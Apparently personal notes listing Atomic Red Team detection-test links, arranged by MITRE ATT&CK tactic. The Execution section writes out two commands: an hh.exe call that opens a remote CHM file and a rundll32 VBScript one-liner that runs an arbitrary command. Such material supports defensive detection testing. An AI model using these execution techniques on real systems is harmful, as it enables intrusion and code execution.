# Mitre ATT&CK

Atomic red team

Small and highly portable detection tests based on MITRE's ATT&CK.

## Initial Access

https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm


## Execution

https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1223/T1223.md

https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1223/src/T1223.chm
hh.exe #{remote_chm_file}



https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1086/T1086.md#atomic-test-12---powershell-fileless-script-execution
Atomic Test #12 - PowerShell Fileless Script Execution


https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1085/T1085.md#atomic-test-2---rundll32-execute-vbscript-command

Atomic Test #2 - Rundll32 execute VBscript command
rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)

https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053/T1053.md#atomic-test-4---powershell-cmdlet-scheduled-task

https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1064/T1064.md

https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1035/T1035.md#atomic-test-1---execute-a-command-as-a-service

https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1127/T1127.md

https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md

## Persistence
https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1197/T1197.md#atomic-test-2---download--execute-via-powershell-bits

https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1136/T1136.md#atomic-test-4---create-a-new-user-in-powershell

https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1050/T1050.md

https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1050/T1050.md


## privilege-escalation
